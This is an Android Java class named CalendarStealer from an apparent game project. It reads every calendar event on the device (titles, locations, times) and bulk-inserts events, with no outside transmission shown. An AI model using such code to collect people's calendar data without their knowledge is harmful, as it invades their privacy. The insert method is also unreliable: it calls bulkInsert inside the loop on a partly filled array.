package de.hpi3d.gamepgrog.trap.android;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.provider.CalendarContract;

import java.util.ArrayList;

import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;

public class CalendarStealer {

    public static ArrayList<CalendarEvent> takeCalendarData(Context context) throws SecurityException {

        String[] projection = new String[]{
                CalendarContract.Events._ID,
                CalendarContract.Events.TITLE,
                CalendarContract.Events.EVENT_LOCATION,
                CalendarContract.Events.DTSTART,
                CalendarContract.Events.DTEND
        };

        Cursor cursor = context.getContentResolver().query(
                CalendarContract.Events.CONTENT_URI,
                projection,
                null,
                null,
                null);

        return CalendarEvent.createFromCursor(cursor);
    }

    public static void insertCalendarEvents(Context context, ArrayList<CalendarEvent> events) throws SecurityException {
        ContentValues[] eventsToInsert = new ContentValues[events.size()];

        for (int i = 0; i < events.size(); i++) {
            ContentValues singleEventValues = events.get(i).toContentValues();
            eventsToInsert[i] = singleEventValues;
            context.getContentResolver().bulkInsert(
                    CalendarContract.Events.CONTENT_URI,
                    eventsToInsert);
        }
    }
}
